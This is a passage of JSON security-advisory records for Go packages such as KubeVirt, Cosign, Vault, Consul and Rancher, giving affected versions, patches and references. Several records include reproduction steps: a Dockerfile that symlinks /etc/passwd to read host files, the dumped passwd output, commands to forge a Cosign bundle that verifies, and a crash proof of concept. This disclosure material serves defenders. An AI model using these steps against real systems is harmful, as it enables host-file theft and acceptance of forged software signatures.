links on the API, using malicious links in the containerDisk itself can have the same effect:\n\n```Dockerfile\nFROM <anybase>\nRUN mkdir -p /etc/ && touch /etc/passwd\nRUN mkdir -p /disks/ && ln -s /etc/passwd /disks/disk.img\n```\n\n3. KubeVirt allows PVC hotplugging. The hotplugged PVC is under user-control and it is possible to place absolute links there. Since containerDisk and hotplug code use the same mechanism to provide the disk to the virt-launcher pod, it can be used too to do arbitrary host file reads.\n\nIn all three cases it is then possible to at lest read any host file:\n\n```\n$ sudo cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n```\n\n\n### Patches\n\nKubeVirt 0.55.1 provides patches to fix the vulnerability.\n\n\n### Workarounds\n\n* Ensure that the `HotplugVolumes` feature-gate is disabled\n* ContainerDisk support can't be disabled. The only known way to mitigate this issue is create with e.g. policy controller a conditiontemplate which ensures that no containerDisk gets added and that `spec.domain.firmware.kernelBoot` is not used on VirtualMachineInstances.|\n* Ensure that SELinux is enabled. It blocks most attempts to read host files but does not provide a 100% guarantee (like vm-to-vm read may still work).\n\n### References\n\n\nDisclosure notice form the discovering party: https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm\n\n### For more information\n\nFor interested vendors which have to provide a fix for their supported versions, the following PRs are providing the fix:\n\n * https://github.com/kubevirt/kubevirt/pull/8198\n * https://github.com/kubevirt/kubevirt/pull/8268\n \n### Credits\nOliver Brooks and James Klopchic of NCC Group\nDiane Dubois and Roman Mohr of Google\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "kubevirt.io/kubevirt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.20.0"}, {"fixed": "0.55.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/security-research/security/advisories/GHSA-cvx8-ppmc-78hm"}, {"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/security/advisories/GHSA-qv98-3369-g364"}, {"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/pull/8198"}, {"type": "WEB", "url": "https://github.com/kubevirt/kubevirt/pull/8268"}, {"type": "PACKAGE", "url": "https://github.com/kubevirt/kubevirt"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:20:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-69cg-p879-7622", "modified": "2023-01-18T00:05:31Z", "published": "2022-09-07T00:01:51Z", "aliases": ["CVE-2022-27664"], "summary": "golang.org/x/net/http2 Denial of Service vulnerability", "details": "In net/http in Go before 1.18.6 and 1.19.x before 1.19.1, attackers can cause a denial of service because an HTTP/2 connection can hang during closing if shutdown were preempted by a fatal error.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220906165146-f3363e06e74c"}]}]}, {"package": {"ecosystem": "Go", "name": "golang.org/x/net/http2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20220906165146-f3363e06e74c"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27664"}, {"type": "PACKAGE", "url": "https://cs.opensource.google/go/x/net"}, {"type": "WEB", "url": "https://go.dev/cl/428735"}, {"type": "WEB", "url": "https://go.dev/issue/54658"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/x49AQzIVX-s"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JXKTHIGE5F576MAPFYCIJXNRGBSPISUF/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXS2OQ57KZC5XZKK5UW4SYKPVQAHIOJX/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0969"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202209-26"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220923-0004/"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-18T00:05:31Z", "nvd_published_at": "2022-09-06T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5rc4-v5mj-g8c4", "modified": "2022-10-04T21:42:30Z", "published": "2022-09-29T00:00:27Z", "aliases": ["CVE-2022-32169"], "summary": "Bytebase does not restrict low privilege user to access admin issues", "details": "The `Bytebase` application does not restrict low privilege user to access `admin issues` for which an unauthorized user can view the `OPEN` and `CLOSED` issues by `Admin` and the affected endpoint is `/issue`.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bytebase/bytebase"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.0"}, {"last_affected": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32169"}, {"type": "PACKAGE", "url": "https://github.com/bytebase/bytebase"}, {"type": "WEB", "url": "https://github.com/bytebase/bytebase/blob/1.0.4/frontend/src/store/modules/issue.ts#L108-#L187"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32169"}], "database_specific": {"cwe_ids": ["CWE-732"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-04T21:42:30Z", "nvd_published_at": "2022-09-28T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8gw7-4j42-w388", "modified": "2022-09-16T19:13:13Z", "published": "2022-09-16T19:13:13Z", "aliases": ["CVE-2022-36056"], "summary": "Cosign bundle can be crafted to successfully verify a blob even if the embedded rekorBundle does not reference the given signature", "details": "## Summary\n\nA number of vulnerabilities have been found in `cosign verify-blob`, where Cosign would successfully verify an artifact when verification should have failed.\n\n## Vulnerability 1: Bundle mismatch causes invalid verification.\n\n### Summary\nA cosign bundle can be crafted to successfully verify a blob even if the embedded rekorBundle does not reference the given signature.\n\n### Details\nCosign supports \"bundles\" which intend to allow offline verification of the signature and rekor inclusion. By using the --bundle flag in cosign sign-blob, cosign will create a JSON file called a \"bundle\". These bundles include three fields: base64Signature, cert, and rekorBundle. The desired behavior is that the verification of these bundles would:\n\n- verify the provided blob using the included signature and certificate\n- verify the rekorBundle SET\n- verify the rekorBundle payload references the given artifact.\n\nIt appears that step three is not being performed, allowing \"any old rekorBundle\" to pass validation, even if the rekorBundle payload does not reference the provided blob or the certificate and signature in the rekorBundle do not match those at the top level.\n\n### Steps to reproduce\nEnable keyless signing:\n\n```\nexport COSIGN_EXPERIMENTAL=1\n```\nCreate two random blobs:\n```\ndd bs=1 count=50 </dev/urandom >blob1\ndd bs=1 count=50 </dev/urandom >blob2\n```\nSign each blob:\n```\ncosign sign-blob blob1 --bundle bundle1\ncosign sign-blob blob2 --bundle bundle2\n```\nCreate a falsified bundle including the base64Signature and cert fields from bundle1 and the rekorBundle from bundle2:\n```\njq --slurpfile bundle2 bundle2 '.rekorBundle = $bundle2[0].rekorBundle' bundle1 > invalidBundle\n```\nNow, the falsified bundle can be used to verify blob1:\n```\n$ cosign verify-blob blob1 --bundle invalidBundle\ntlog entry verified offline\nVerified OK\n```\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workaround\n\nIf you extract the signature and certificate from the `bundle`, you may use it for verification as follows and avoid using an invalid bundle:\n```\n$ cosign verify-blob blob1 --signature $(jq -r '.base64Signature' bundle1) --certificate $(jq -r '.cert' bundle1)\n```\n\nNote that this will make a network call to Rekor to fetch the Rekor entry. However, you may then be subject to Vulnerability 4.\n\n##  Vulnerability 2: Certificate Identities are not checked in some cases\n\n### Summary \n\nWhen providing identity flags, the email and issuer of a certificate is not checked when verifying a Rekor bundle, and the GitHub Actions identity is never checked.\n\n### Details\n\nUsers who provide an offline Rekor bundle (`--bundle`) when verifying a blob using `cosign verify-blob` and include flags that check identity such as `--certificate-email` and `--certificate-oidc-issuer` are impacted. Additionally, users who provide the GitHub Actions verification flags such as `--certificate-github-workflow-name` when running `cosign verify-blob` without a bundle, key reference, or certificate are impacted. \n\nWhen providing these flags, Cosign ignored their values. If a certificate's identity did not match the provided flags, Cosign would still successfully verify the blob.\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n##  Vulnerability 3: Invalid Rekor bundle without the experimental flag will result in successful verification\n\n### Summary\n\nProviding an invalid Rekor bundle without the experimental flag results in a successful verification.\n\n### Details\n\nUsers who provide an offline Rekor bundle (`--bundle`) that was invalid (invalid signed entry timestamp, expired certificate, or malformed) when verifying a blob with `cosign verify-blob` and do not set the `COSIGN_EXPERIMENTAL=1` flag are impacted.\n\nWhen an invalid bundle was provided, Cosign would fallback to checking Rekor log inclusion by requesting proof of inclusion from the log. However, without the `COSIGN_EXPERIMENTAL` flag, Cosign would exit early and successfully verify the blob. \n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n##  Vulnerability 4: Invalid transparency log entry will result in successful verification\n\n### Summary\n\nAn invalid transparency log entry will result in immediate success for verification.\n\n### Details\n\nUsers who provide a signature and certificate to `verify-blob` will fetch the associated Rekor entry for verification. If the returned entry was invalid (invalid signed entry timestamp, invalid inclusion proof, malformed entry with missing verification), then `cosign` [exits](https://github.com/sigstore/cosign/blob/42c6e2a6dd9d92d19077c8e6b7d66d155a5ea28c/cmd/cosign/cli/verify/verify_blob.go#L357) early and succeeds unconditionally.\n\n### Patches\n\nUsers should update to the latest version of Cosign, `1.12.0`.\n\n### Workarounds\n\nThere are no workarounds, users should update.\n\n\n## For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cosign](https://github.com/sigstore/cosign)\n* Send us a message on [Slack](https://sigstore.slack.com/).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sigstore/cosign"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.11.1"}}], "references": [{"type": "WEB", "url": "https://github.com/sigstore/cosign/security/advisories/GHSA-8gw7-4j42-w388"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36056"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/commit/80b79ed8b4d28ccbce3d279fd273606b5cddcc25"}, {"type": "PACKAGE", "url": "https://github.com/sigstore/cosign"}, {"type": "WEB", "url": "https://github.com/sigstore/cosign/releases/tag/v1.12.0"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-16T19:13:13Z", "nvd_published_at": "2022-09-14T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xhmf-mmv2-4hhx", "modified": "2022-09-16T20:59:43Z", "published": "2022-09-16T20:59:43Z", "aliases": ["CVE-2022-39213"], "summary": "Go-CVSS has Out-of-bounds Read vulnerability in ParseVector function", "details": "### Impact\nWhen a full CVSS v2.0 vector string is parsed using `ParseVector`, an Out-of-Bounds Read is possible due to a lack of tests. The Go module will then panic.\n\n### Patches\nThe problem is patched in tag `v0.4.0`, by the commit `d9d478ff0c13b8b09ace030db9262f3c2fe031f4`.\n\n### Workarounds\nThe only way to avoid it is by parsing CVSS v2.0 vector strings that does not have all attributes defined (e.g. `AV:N/AC:L/Au:N/C:P/I:P/A:C/E:U/RL:OF/RC:C/CDP:MH/TD:H/CR:M/IR:M/AR:M`).\n\n### References\nN/A\n\n### CPE v2.3\nAs stated in [SECURITY.md](https://github.com/pandatix/go-cvss/blob/master/SECURITY.md), the CPE v2.3 to refer to this Go module is `cpe:2.3:a:pandatix:go_cvss:*:*:*:*:*:*:*:*`.\nThe entry has already been requested to the NVD CPE dictionnary.\n\n### Exploit example\n```go\npackage main\n\nimport (\n\t\"log\"\n\n\tgocvss20 \"github.com/pandatix/go-cvss/20\"\n)\n\nfunc main() {\n\t_, err := gocvss20.ParseVector(\"AV:N/AC:L/Au:N/C:P/I:P/A:C/E:U/RL:OF/RC:C/CDP:MH/TD:H/CR:M/IR:M/AR:M\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n```\n\nWhen ran, the following trace is returned.\n```\npanic: runtime error: index out of range [3] with length 3\n\ngoroutine 1 [running]:\ngithub.com/pandatix/go-cvss/20.ParseVector({0x4aed6c?, 0x0?})\n        /home/lucas/go/pkg/mod/github.com/pandatix/go-cvss@v0.2.0/20/cvss20.go:54 +0x578\nmain.main()\n        /media/lucas/HDD-K/Documents/cve-2022-xxxxx/main.go:10 +0x25\nexit status 2\n```\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [pandatix/go-cvss](https://github.com/pandatix/go-cvss/issues)\n* Email me at [lucastesson@protonmail.com](mailto:lucastesson@protonmail.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pandatix/go-cvss"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.2.0"}, {"fixed": "0.4.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pandatix/go-cvss/security/advisories/GHSA-xhmf-mmv2-4hhx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39213"}, {"type": "WEB", "url": "https://github.com/pandatix/go-cvss/commit/d9d478ff0c13b8b09ace030db9262f3c2fe031f4"}, {"type": "PACKAGE", "url": "https://github.com/pandatix/go-cvss"}, {"type": "WEB", "url": "https://github.com/pandatix/go-cvss/blob/master/SECURITY.md"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1002"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T20:59:43Z", "nvd_published_at": "2022-09-15T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-54qx-8p8w-xhg8", "modified": "2022-09-16T21:05:28Z", "published": "2022-09-16T21:05:28Z", "aliases": ["CVE-2022-36071"], "summary": "SFTPGo vulnerable to recovery codes abuse", "details": "### Impact\n\nSFTPGo WebAdmin and WebClient support login using TOTP (Time-based One Time Passwords) as a seconday authentication factor. Because TOTPs are often configured on mobile devices that can be lost, stolen or damaged, SFTPGo also supports recovery codes. These are a set of one time use codes that can be used instead of the TOTP.\n\nIn SFTPGo versions from v2.2.0 to v2.3.3 recovery codes can be generated before enabling two-factor authentication.\nAn attacker who knows the user's password could potentially generate some recovery codes and then bypass two-factor authentication after it is enabled on the account at a later time.\n\n### Patches\n\nFixed in v2.3.4.\nRecovery codes can now only be generated after enabling two-factor authentication and are deleted after disabling it.\n\n### Workarounds\n\nRegenerate recovery codes after enabling two-factor authentication.\n\n### References\n\nhttps://github.com/drakkan/sftpgo/issues/965\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/drakkan/sftpgo/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/drakkan/sftpgo/security/advisories/GHSA-54qx-8p8w-xhg8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36071"}, {"type": "WEB", "url": "https://github.com/drakkan/sftpgo/issues/965"}, {"type": "PACKAGE", "url": "https://github.com/drakkan/sftpgo"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-916"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T21:05:28Z", "nvd_published_at": "2022-09-02T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7cgv-v83v-rr87", "modified": "2022-09-27T08:12:04Z", "published": "2022-09-23T00:00:46Z", "aliases": ["CVE-2022-40186"], "summary": "HashiCorp Vault vulnerable to incorrect metadata access", "details": "An issue was discovered in HashiCorp Vault and Vault Enterprise before 1.11.3. A vulnerability in the Identity Engine was found where, in a deployment where an entity has multiple mount accessors with shared alias names, Vault may overwrite metadata to the wrong alias due to an issue with checking the proper alias assigned to an entity. This may allow for unintended access to key/value paths using that metadata in Vault.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.9.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40186"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-18-vault-entity-alias-metadata-may-leak-between-aliases-with-the-same-name-assigned-to-the-same-entity/44550"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20221111-0008/"}], "database_specific": {"cwe_ids": [], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-23T20:58:54Z", "nvd_published_at": "2022-09-22T01:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m69r-9g56-7mv8", "modified": "2023-09-06T18:54:15Z", "published": "2022-09-25T00:00:27Z", "aliases": ["CVE-2022-40716"], "summary": "HashiCorp Consul vulnerable to authorization bypass", "details": "HashiCorp Consul and Consul Enterprise versions prior to 1.11.9, 1.12.5, and 1.13.2 do not check for multiple SAN URI values in a CSR on the internal RPC endpoint, enabling leverage of privileged access to bypass service mesh intentions. A specially crafted CSR sent directly to Consul\u2019s internal server agent RPC endpoint can include multiple SAN URI values with additional service names. This issue has been fixed in versions 1.11.9, 1.12.5, and 1.13.2. There are no known workarounds.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.11.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/consul"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40716"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/pull/14579"}, {"type": "WEB", "url": "https://github.com/hashicorp/consul/commit/8f6fb4f6fe9488b8ec37da71ac503081d7d3760b"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-20-consul-service-mesh-intention-bypass-with-malicious-certificate-signing-request/44628"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/consul"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LYZOKMMVX4SIEHPJW3SJUQGMO5YZCPHC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZTE4ITXXPIWZEQ4HYQCB6N6GZIMWXDAI/"}], "database_specific": {"cwe_ids": ["CWE-252"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-29T14:39:58Z", "nvd_published_at": "2022-09-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gmhj-xjfh-cf6m", "modified": "2022-09-23T21:37:21Z", "published": "2022-09-23T21:37:21Z", "aliases": [], "summary": "Caddy-SSH vulnerable to Authorization Bypass due to incorrect usage of PAM library", "details": "Not invoking a call to `pam_acct_mgmt` after a call to `pam_authenticate` to check the validity of a login can lead to an authorization bypass.\n\n### Impact\n\n#### Exploitability\n\nThe attack can be carried over the network. A complex non-standard configuration or a specialized condition is required for the attack to be successfully conducted. The attacker also requires access to a users credentials, be it expired, for an attack to be successful. There is no user interaction required for successful execution. The attack can affect components outside the scope of the target module.\n\n#### Impact\n\nUsing this attack vector, an attacker may access otherwise restricted parts of the system. The attack can be used to gain access to confidential files like passwords, login credentials and other secrets. Hence, it has a high impact on confidentiality. It may also be directly used to affect a change on a system resource. Hence has a medium to high impact on integrity. This attack may not be used to affect the availability of the system. Taking this account an appropriate CVSS v3.1 vector would be\n[AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L&version=3.1)\n\n### Root Cause Analysis\n\nIn this case, in the following PAM transaction, only a call to `pam.Authenticate` is used to login a user.\n\nhttps://github.com/mohammed90/caddy-ssh/blob/1d980ceea6e67765daf19b5e644c7a0773fdaa13/internal/authentication/os/pam.go#L60\n\nThis implies that a user with expired credentials can still login.\n\nThe bug can be verified easily by creating a new user account, expiring it with `chage -E0 <username>` and then trying to log in with the expired credentials.\n\n### Patches\nThis can be fixed by invoking a call to `pam.AcctMgmt` after a successful call to `pam.Authenticate`\n\n### References\n* [Man Page for pam_acct_mgmt](https://man7.org/linux/man-pages/man3/pam_acct_mgmt.3.html)\n* [CWE-863](http://cwe.mitre.org/data/definitions/863.html)\n* [CWE-285](http://cwe.mitre.org/data/definitions/285.html)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mohammed90/caddy-ssh"}, "versions": ["0.0.1"]}], "references": [{"type": "WEB", "url": "https://github.com/mohammed90/caddy-ssh/security/advisories/GHSA-gmhj-xjfh-cf6m"}, {"type": "WEB", "url": "https://github.com/mohammed90/caddy-ssh/commit/4b3e639d64c55f91152ffb51a4af35a8845c95a3"}, {"type": "PACKAGE", "url": "https://github.com/mohammed90/caddy-ssh"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-23T21:37:21Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rc4r-wh2q-q6c4", "modified": "2022-09-16T21:00:46Z", "published": "2022-09-16T21:00:46Z", "aliases": ["CVE-2022-36109"], "summary": "Moby supplementary group permissions not set up properly, allowing attackers to bypass primary group restrictions", "details": "Moby is an open-source project created by Docker to enable software containerization. A bug was found in Moby (Docker Engine) where supplementary groups are not set up properly. If an attacker has direct access to a container and manipulates their supplementary group access, they may be able to use supplementary group access to bypass primary group restrictions in some cases, potentially gaining access to sensitive information or gaining the ability to execute code in that container.  This bug is fixed in Moby (Docker Engine) 20.10.18. Users should update to this version when it is available. Running containers should be stopped and restarted for the permissions to be fixed. For users unable to upgrade, this problem can be worked around by not using the `\"USER $USERNAME\"` Dockerfile instruction. Instead by calling `ENTRYPOINT [\"su\", \"-\", \"user\"]` the supplementary groups will be set up properly.\n\nThanks to Steven Murdoch for reporting this issue.\n\n----\n\n### Impact\n\nIf an attacker has direct access to a container and manipulates their supplementary group access, they may be able to use supplementary group access to bypass primary group restrictions in some cases, potentially gaining access to sensitive information or gaining the ability to execute code in that container. \n\n### Patches\n\n This bug is fixed in Moby (Docker Engine) 20.10.18. Users should update to this version when it is available.\n\n### Workarounds\n\nThis problem can be worked around by not using the `\"USER $USERNAME\"` Dockerfile instruction. Instead by calling `ENTRYPOINT [\"su\", \"-\", \"user\"]` the supplementary groups will be set up properly.\n\n### References\n\nhttps://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/moby/moby/issues/new)\n* Email us at [security@docker.com](mailto:security@docker.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moby/moby"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "20.10.18"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moby/moby/security/advisories/GHSA-rc4r-wh2q-q6c4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36109"}, {"type": "WEB", "url": "https://github.com/moby/moby/commit/de7af816e76a7fd3fbf06bffa6832959289fba32"}, {"type": "PACKAGE", "url": "https://github.com/moby/moby"}, {"type": "WEB", "url": "https://github.com/moby/moby/releases/tag/v20.10.18"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/O7JL2QA3RB732MLJ3RMUXB3IB7AA22YU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RQQ4E3JBXVR3VK5FIZVJ3QS2TAOOXXTQ/"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-16T21:00:46Z", "nvd_published_at": "2022-09-09T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pfw4-xjgm-267c", "modified": "2022-09-15T03:28:01Z", "published": "2022-09-15T03:28:01Z", "aliases": ["CVE-2022-39200"], "summary": "Dendrite signature checks not applied to some retrieved missing events", "details": "### Impact\n\nEvents retrieved from a remote homeserver using `/get_missing_events` did not have their signatures verified correctly. This could potentially allow a remote homeserver to provide invalid/modified events to Dendrite via this endpoint.\n\nNote that this does not apply to events retrieved through other endpoints (e.g. `/event`, `/state`) as they have been correctly verified.\n\nHomeservers that have federation disabled are not vulnerable.\n\n### Patches\n\nThe problem has been fixed in Dendrite 0.9.8.\n\n### Workarounds\n\nThere are no workarounds.\n\n### Special thanks\n\nTulir Asokan, who spotted the issue originally.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/matrix-org/dendrite"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.8"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/matrix-org/dendrite/security/advisories/GHSA-pfw4-xjgm-267c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39200"}, {"type": "WEB", "url": "https://github.com/matrix-org/dendrite/commit/2792d0490f3771488bad346981b8c26479a872c3"}, {"type": "PACKAGE", "url": "https://github.com/matrix-org/dendrite"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:28:01Z", "nvd_published_at": "2022-09-12T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g7j7-h4q8-8w2f", "modified": "2022-09-23T18:11:28Z", "published": "2022-09-23T18:11:28Z", "aliases": ["CVE-2021-36782"], "summary": "Rancher API and cluster.management.cattle.io object vulnerable to plaintext storage and exposure of credentials", "details": "### Impact\nAn issue was discovered in Rancher versions up to and including 2.5.15 and 2.6.6 where sensitive fields, like passwords, API keys and Rancher's service account token (used to provision clusters), were stored in plaintext directly on Kubernetes objects like `Clusters`, for example `cluster.management.cattle.io`. Anyone with read access to those objects in the Kubernetes API could retrieve the plaintext version of those sensitive data.\n\nThe exposed credentials are visible in Rancher to authenticated `Cluster Owners`, `Cluster Members`, `Project Owners`, `Project Members` and `User Base` on the endpoints:\n- `/v1/management.cattle.io.catalogs`\n- `/v1/management.cattle.io.cluster`\n- `/v1/management.cattle.io.clustertemplates`\n- `/v1/management.cattle.io.notifiers`\n- `/v1/project.cattle.io.sourcecodeproviderconfig`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/catalogs`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/clusters`\n-  `/k8s/clusters/local/apis/management.cattle.io/v3/clustertemplates`\n- `/k8s/clusters/local/apis/management.cattle.io/v3/notifiers`\n- `/k8s/clusters/local/apis/project.cattle.io/v3/sourcecodeproviderconfigs`\n\nSensitive fields are now stripped from `Clusters` and other objects and moved to a `Secret` before the object is stored. The `Secret` is retrieved when the credential is needed. For objects that existed before this security fix, a one-time migration happens on startup.\n\n**Important:**\n- The 